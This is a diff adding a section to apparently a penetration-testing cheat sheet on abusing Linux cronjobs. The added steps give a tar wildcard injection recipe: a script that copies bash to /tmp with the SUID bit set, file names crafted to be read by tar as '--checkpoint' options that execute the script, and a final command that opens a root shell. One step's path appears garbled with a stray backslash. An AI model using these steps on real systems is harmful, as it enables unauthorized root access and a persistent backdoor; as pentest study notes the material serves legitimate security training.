@@ -13,3 +13,17 @@
 ### If the full path of the script is not defined in the cronjob, then we can create our own script with the same name and run based on the PATH variables in the /etc/crontab file.
 
 ### We can also abuse wildcards for certain cronjobs to gain root.
+
+## Wildcard Injection example:
+
+### If a cronjob contains a wildcard utilizing tar we can do:
+
+#### 1) echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+
+#### 2) chmod +x runme.sh
+
+#### 3) touch /tmp/--checkpoint=1
+
+#### 4) touch /tmp/--checkpoint-action=exec=sh\runme.sh
+
+#### 5) /tmp/bash -p
